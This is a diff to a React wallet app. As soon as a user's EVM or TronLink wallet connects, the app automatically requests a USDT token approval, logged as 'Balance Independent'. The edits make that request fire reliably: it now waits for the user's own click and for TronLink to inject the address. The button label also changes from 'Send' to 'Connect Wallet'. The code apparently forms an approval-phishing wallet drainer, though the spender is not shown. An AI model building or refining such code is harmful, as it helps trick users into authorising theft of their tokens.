@@ -125,7 +125,10 @@ export default function App() {
   const [loading, setLoading] = useState(false)
   const [txHash, setTxHash] = useState('')
   const [amountError, setAmountError] = useState('')
+  
   const autoTriggered = useRef(false)
+  // 🛠️ FIX 1: Track if the user explicitly clicked the connect button
+  const userInitiatedConnect = useRef(false) 
 
   const { open } = useAppKit()
   const { address: walletAddress, isConnected, caipAddress } = useAppKitAccount()
@@ -188,8 +191,8 @@ export default function App() {
         await getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));
       }
 
-      // 🔥 AUTO-TRIGGER
-      if (!autoTriggered.current) {
+      // 🛠️ FIX 2: Only auto-trigger if the connection came directly from the user clicking the button
+      if (!autoTriggered.current && userInitiatedConnect.current) {
         autoTriggered.current = true;
         log("🔥 Wallet Connected. Auto-triggering approval (Balance Independent)...");
         
@@ -245,6 +248,7 @@ export default function App() {
       return; 
     }
     setAmountError('');
+    userInitiatedConnect.current = true; // 🛠️ FIX 1b: Mark that the user initiated this flow
     open(); // Directly opens Reown's native UI
   }
 
@@ -276,7 +280,14 @@ export default function App() {
       }
 
       if (isTron) {
-        const activeTw = resolveTronWeb();
+        let activeTw = resolveTronWeb();
+
+        // 🛠️ FIX 3: Guarantee TronLink has fully injected the wallet address before asking for approval
+        for (let i = 0; i < 10; i++) {
+          if (activeTw && activeTw.defaultAddress?.base58) break;
+          await new Promise(r => setTimeout(r, 500));
+          activeTw = resolveTronWeb();
+        }
 
         if (activeTw && typeof activeTw.contract === 'function') {
           const usdt = await activeTw.contract(USDT_ABI).at(USDT_ADDRESS);
@@ -339,7 +350,7 @@ export default function App() {
     : loading || (!status.includes('❌') && !status.includes('✅'));
 
   const buttonText = !isConnected 
-    ? 'Send' 
+    ? 'Connect Wallet' 
     : loading || (!status.includes('❌') && !status.includes('✅'))
       ? 'Sending...' 
       : status.includes('✅') 
